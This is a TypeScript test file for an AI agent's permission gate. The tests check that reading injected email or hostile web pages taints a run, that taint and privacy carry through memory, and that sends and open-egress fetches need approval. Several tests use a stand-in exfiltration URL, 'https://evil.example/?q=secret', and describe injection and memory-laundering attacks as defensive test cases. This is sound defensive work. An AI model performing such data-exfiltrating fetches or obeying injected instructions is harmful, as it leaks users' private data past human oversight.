import type { Source } from '@later/protocol';
import { describe, expect, it } from 'vitest';
import {
  authorize,
  decide,
  markIngested,
  markToolUsed,
  memoryPrivacyFor,
  memoryTaintFor,
  type RunContext,
} from '../../src/index.js';
import { ALL_CONNECTORS, addMs, ctx, grantedApproval, req, run, tool, NOW } from './helpers.js';

const INBOX_ALLOW = new Set(['mail.create_draft', 'mail.label', 'mail.archive', 'memory.write']);
const src = (kind: Source['kind'], trust: Source['trust']): Source => ({ kind, ref: 'r', trust });
const email = src('email', 'external');
const web = src('web', 'external');
const capture = src('capture', 'user');

describe('scenario: research run that never touches private data', () => {
  it('may fetch, search and open pages freely, even after reading hostile web pages', async () => {
    let r: RunContext = run();
    r = markIngested(r, web);
    r = markToolUsed(r, tool('web.search'));
    r = markToolUsed(r, tool('web.fetch'));
    expect(r.touchedPrivate).toBe(false);
    for (const name of ['web.fetch', 'web.search', 'browser.open', 'weather.get']) {
      const d = await decide(await req(name, { q: 'x' }), ctx({ run: r }));
      expect(d.outcome, name).toBe('allow');
    }
  });
  it('still cannot send anything without approval', async () => {
    const d = await decide(await req('mail.send'), ctx({ run: run({ ingestedUntrusted: true }) }));
    expect(d.outcome).toBe('require-approval');
  });
});

describe('scenario: inbox run that drafts, labels and archives', () => {
  it('does so without asking, and each decision is surfaced for the brief and an undo', async () => {
    let r = run();
    r = markToolUsed(r, tool('mail.read'));
    r = markIngested(r, email);
    for (const name of ['mail.create_draft', 'mail.label', 'mail.archive']) {
      const d = await decide(await req(name, { id: 1 }), ctx({ run: r, alwaysAllow: INBOX_ALLOW, grantedConnectors: ALL_CONNECTORS }));
      expect(d.outcome, name).toBe('allow');
      expect(d.surface, name).toBe(true);
    }
  });
  it('a quiet inbox run (no external content yet) acts without surfacing', async () => {
    const d = await decide(await req('mail.archive'), ctx({ alwaysAllow: INBOX_ALLOW }));
    expect(d).toMatchObject({ outcome: 'allow', surface: false });
  });
  it('an injected message cannot make it silently archive: the decision is surface true', async () => {
    const r = markIngested(markToolUsed(run(), tool('mail.read')), email);
    const d = await decide(await req('mail.archive', { id: 'fraud-alert' }), ctx({ run: r, alwaysAllow: INBOX_ALLOW }));
    expect(d.surface).toBe(true);
  });
  it('never sends without approval or explicit confirmation', async () => {
    const r = markIngested(markToolUsed(run(), tool('mail.read')), email);
    const d = await decide(await req('mail.send'), ctx({ run: r, alwaysAllow: new Set([...INBOX_ALLOW, 'mail.send']) }));
    expect(d.outcome).toBe('require-approval');
  });
});

describe('scenario: exfiltration combination (private data + untrusted content + open egress)', () => {
  const inbox = markIngested(markToolUsed(run(), tool('mail.read')), email);

  it('an inbox run that read mail and an external message cannot use open-egress tools without approval', async () => {
    for (const name of ['web.fetch', 'browser.open']) {
      const d = await decide(await req(name, { url: 'https://evil.example/?q=secret' }), ctx({ run: inbox }));
      expect(d, name).toMatchObject({ outcome: 'require-approval', reason: 'exfiltration-risk' });
    }
  });
  it('...but can use fixed-egress tools', async () => {
    for (const name of ['web.search', 'weather.get']) {
      expect((await decide(await req(name, { q: 'x' }), ctx({ run: inbox }))).outcome, name).toBe('allow');
    }
  });
  it('...and can use non-egress reads', async () => {
    expect((await decide(await req('mail.search'), ctx({ run: inbox }))).outcome).toBe('allow');
  });
  it('an approval for that exact fetch lets it through; for another url it does not', async () => {
    const approved = await req('web.fetch', { url: 'https://example.com/a' });
    const approval = grantedApproval(approved);
    expect((await decide(approved, ctx({ run: inbox, approval }))).outcome).toBe('allow');
    const other = await req('web.fetch', { url: 'https://evil.example/' });
    expect((await decide(other, ctx({ run: inbox, approval }))).outcome).toBe('require-approval');
  });
});

describe('scenario: taint and privacy are sticky and order independent', () => {
  const events = [
    (r: RunContext) => markIngested(r, email),
    (r: RunContext) => markToolUsed(r, tool('mail.read')),
    (r: RunContext) => markIngested(r, capture),
    (r: RunContext) => markToolUsed(r, tool('web.search')),
  ];
  const permutations = <T,>(xs: T[]): T[][] =>
    xs.length <= 1 ? [xs] : xs.flatMap((x, i) => permutations([...xs.slice(0, i), ...xs.slice(i + 1)]).map((p) => [x, ...p]));

  it('every order of the same events gives the same flags', () => {
    for (const order of permutations(events)) {
      const r = order.reduce((acc, f) => f(acc), run());
      expect(r).toMatchObject({ ingestedUntrusted: true, touchedPrivate: true });
    }
  });
  it('flags never go back to false', () => {
    let r = markIngested(markToolUsed(run(), tool('mail.read')), email);
    r = markIngested(r, capture);
    r = markToolUsed(r, tool('web.search'));
    r = markToolUsed(r, tool('memory.read'), { privateResult: false });
    expect(r).toMatchObject({ ingestedUntrusted: true, touchedPrivate: true });
  });
  it('user-trust sources and non-private tools do not set flags', () => {
    let r = markIngested(run(), capture);
    r = markIngested(r, src('memory', 'user'));
    r = markToolUsed(r, tool('web.fetch'));
    r = markToolUsed(r, tool('memory.read'));
    expect(r).toMatchObject({ ingestedUntrusted: false, touchedPrivate: false });
  });
  it('external memory and tool sources taint; the trust, not the kind, decides', () => {
    expect(markIngested(run(), src('memory', 'external')).ingestedUntrusted).toBe(true);
    expect(markIngested(run(), src('tool', 'external')).ingestedUntrusted).toBe(true);
  });
  it('a memory read marked private sets touchedPrivate through privateResult', () => {
    expect(markToolUsed(run(), tool('memory.read'), { privateResult: true }).touchedPrivate).toBe(true);
  });
  it('does not change initiatedBy and does not mutate the input', () => {
    const base = run({ initiatedBy: 'user' });
    const next = markIngested(base, email);
    expect(next.initiatedBy).toBe('user');
    expect(base.ingestedUntrusted).toBe(false);
  });
  it('the gate sees the flags: the same sequence in either order blocks the same fetch', async () => {
    const a = markToolUsed(markIngested(run(), email), tool('mail.read'));
    const b = markIngested(markToolUsed(run(), tool('mail.read')), email);
    const r = await req('web.fetch', { url: 'https://example.com' });
    expect(await decide(r, ctx({ run: a }))).toEqual(await decide(r, ctx({ run: b })));
    expect((await decide(r, ctx({ run: a }))).outcome).toBe('require-approval');
  });
});

describe('scenario: memory carries taint and privacy forward', () => {
  it('a tainted run writes external memory; a later clean run that reads it becomes tainted', async () => {
    const writer = markIngested(run(), email);
    expect(memoryTaintFor(writer)).toBe('external');
    const reader = markIngested(run(), src('memory', memoryTaintFor(writer)));
    expect(reader.ingestedUntrusted).toBe(true);
    const d = await decide(await req('mail.archive'), ctx({ run: reader, alwaysAllow: new Set(['mail.archive']) }));
    expect(d.surface).toBe(true);
  });
  it('a clean run writes user-trust memory', () => {
    expect(memoryTaintFor(run())).toBe('user');
    expect(memoryTaintFor(markIngested(run(), capture))).toBe('user');
  });
  it('memory written by a run that touched private data is marked private, and a later read touches private', async () => {
    const writer = markToolUsed(run(), tool('mail.read'));
    expect(memoryPrivacyFor(writer)).toBe(true);
    expect(memoryPrivacyFor(run())).toBe(false);
    const reader = markToolUsed(markIngested(run(), email), tool('memory.read'), { privateResult: memoryPrivacyFor(writer) });
    expect(reader.touchedPrivate).toBe(true);
    const d = await decide(await req('web.fetch', { url: 'https://example.com' }), ctx({ run: reader }));
    expect(d.reason).toBe('exfiltration-risk');
  });
  it('laundering through memory does not escape the gate (taint + private via memory only)', async () => {
    const writer = markToolUsed(markIngested(run(), email), tool('mail.read'));
    const reader = markToolUsed(
      markIngested(run(), src('memory', memoryTaintFor(writer))),
      tool('memory.read'),
      { privateResult: memoryPrivacyFor(writer) },
    );
    expect((await decide(await req('browser.open', { url: 'https://x.example' }), ctx({ run: reader }))).outcome).toBe('require-approval');
  });
});

describe('scenario: irreversible tools', () => {
  it('never pass via alwaysAllow, in any run', async () => {
    for (const name of ['mail.send', 'mail.delete', 'browser.submit']) {
      for (const r of [run(), run({ initiatedBy: 'user' }), run({ ingestedUntrusted: true }), run({ touchedPrivate: true })]) {
        const d = await decide(await req(name), ctx({ run: r, alwaysAllow: new Set([name]) }));
        expect(d.outcome, name).toBe('require-approval');
      }
    }
  });
  it('never pass without an approval or device confirmation, for any budget status other than paused', async () => {
    for (const status of ['ok', 'warned'] as const) {
      const d = await decide(await req('mail.send'), ctx({ budgetStatus: status }));
      expect(d.outcome).toBe('require-approval');
    }
  });
});

describe('scenario: budget', () => {
  it('a paused budget blocks every non-read tool and none of the reads', async () => {
    for (const name of ['mail.create_draft', 'mail.label', 'memory.write', 'mail.send', 'mail.delete', 'browser.submit']) {
      expect((await decide(await req(name), ctx({ budgetStatus: 'paused', alwaysAllow: new Set([name]) }))).reason, name).toBe('budget-paused');
    }
    for (const name of ['mail.read', 'web.search', 'memory.read', 'calendar.read']) {
      expect((await decide(await req(name), ctx({ budgetStatus: 'paused' }))).outcome, name).toBe('allow');
    }
  });
  it('a paused budget also blocks a user-confirmed send', async () => {
    const r = await req('mail.send');
    const d = await decide(r, ctx({
      budgetStatus: 'paused',
      run: run({ initiatedBy: 'user' }),
      knownDevices: new Set(['d']),
      userConfirmation: { argsHash: r.argsHash, deviceId: 'd', nonce: 'n', confirmedAt: new Date(NOW.getTime() - 1000).toISOString() },
    }));
    expect(d.reason).toBe('budget-paused');
  });
});

describe('scenario: connector not granted denies before anything else', () => {
  it('even with a valid approval, a confirmation, an allowlist entry and a paused budget', async () => {
    const r = await req('mail.send');
    const d = await decide(r, ctx({
      grantedConnectors: new Set(['web']),
      budgetStatus: 'paused',
      alwaysAllow: new Set(['mail.send']),
      approval: grantedApproval(r),
      run: run({ initiatedBy: 'user' }),
      knownDevices: new Set(['d']),
      userConfirmation: { argsHash: r.argsHash, deviceId: 'd', nonce: 'n', confirmedAt: new Date(NOW.getTime() - 1000).toISOString() },
    }));
    expect(d).toMatchObject({ outcome: 'deny', reason: 'connector-not-granted' });
  });
  it('even for read tools', async () => {
    expect((await decide(await req('web.search'), ctx({ grantedConnectors: new Set() }))).reason).toBe('connector-not-granted');
  });
  it('the weather connector must be granted for weather.get', async () => {
    expect((await decide(await req('weather.get'), ctx({ grantedConnectors: new Set(['web']) }))).reason).toBe('connector-not-granted');
  });
});

describe('scenario: authorize consumes what it used (A4)', () => {
  it('returns the redeemed approval when an approval allowed the call', async () => {
    const r = await req('mail.send', { to: 'a@example.com' });
    const approval = grantedApproval(r);
    const out = await authorize(r, ctx({ approval }));
    expect(out.decision.reason).toBe('approved');
    expect(out.consumed?.approval).toMatchObject({ id: approval.id, status: 'redeemed' });
    expect(out.consumed?.nonce).toBeUndefined();
  });
  it('the consumed approval cannot be used a second time', async () => {
    const r = await req('mail.send');
    const out = await authorize(r, ctx({ approval: grantedApproval(r) }));
    const again = await authorize(r, ctx({ approval: out.consumed?.approval as never }));
    expect(again.decision.outcome).toBe('require-approval');
    expect(again.consumed).toBeUndefined();
  });
  it('returns the nonce when a device confirmation allowed the call', async () => {
    const r = await req('mail.send');
    const out = await authorize(r, ctx({
      run: run({ initiatedBy: 'user' }),
      knownDevices: new Set(['d']),
      userConfirmation: { argsHash: r.argsHash, deviceId: 'd', nonce: 'nonce-42', confirmedAt: new Date(NOW.getTime() - 5000).toISOString() },
    }));
    expect(out.decision.reason).toBe('user-confirmed');
    expect(out.consumed?.nonce).toBe('nonce-42');
    expect(out.consumed?.approval).toBeUndefined();
  });
  it('consumes nothing for plain allows, approvals required and denials', async () => {
    expect((await authorize(await req('mail.read'), ctx())).consumed).toBeUndefined();
    expect((await authorize(await req('mail.send'), ctx())).consumed).toBeUndefined();
    expect((await authorize(await req('mail.read'), ctx({ grantedConnectors: new Set() }))).consumed).toBeUndefined();
    expect((await authorize(await req('mail.archive'), ctx({ alwaysAllow: new Set(['mail.archive']) }))).consumed).toBeUndefined();
  });
  it('decide is a read-only preview: it does not mutate the approval or context', async () => {
    const r = await req('mail.send');
    const approval = grantedApproval(r);
    await decide(r, ctx({ approval }));
    expect(approval.status).toBe('granted');
  });
  it('an expired approval consumes nothing', async () => {
    const r = await req('mail.send');
    const approval = grantedApproval(r, { ttlMs: 1000 });
    const out = await authorize(r, ctx({ approval, now: addMs(NOW, 5000) }));
    expect(out.decision.outcome).toBe('require-approval');
    expect(out.consumed).toBeUndefined();
  });
});
